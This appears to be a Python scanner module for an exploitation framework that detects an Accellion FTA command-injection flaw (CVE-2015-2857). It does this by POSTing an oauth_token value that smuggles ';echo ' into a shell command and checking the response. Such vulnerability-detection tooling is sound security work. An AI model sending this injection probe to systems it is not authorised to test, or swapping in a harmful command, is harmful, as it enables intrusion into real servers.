#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Accellion FTA oauth_token command injection (CVE-2015-2857)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Accellion FTA - getStatus RCE Detection (CVE-2015-2857)',
        'description': (
            'Detects CVE-2015-2857 by POSTing oauth_token=\';echo \' to /tws/getStatus '
            'and matching Success result_msg.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2015', 'accellion', 'fta', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2015-2857',
        ],
        'cve': 'CVE-2015-2857',
    }

    def run(self):
        tid = self.random_text(8)
        data = f"transaction_id={tid}&oauth_token='%3becho '"
        r = self.http_request(
            method='POST',
            path='/tws/getStatus',
            data=data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
        )
        if not r:
            return False
        body = r.text or ''
        # Require echoed transaction_id to avoid generic Success JSON FPs.
        if f'"result_msg":"Success","transaction_id":"{tid}"' in body:
            self.set_info(
                severity='critical',
                reason='Accellion FTA getStatus RCE (CVE-2015-2857)',
                path='/tws/getStatus',
            )
            return True
        return False
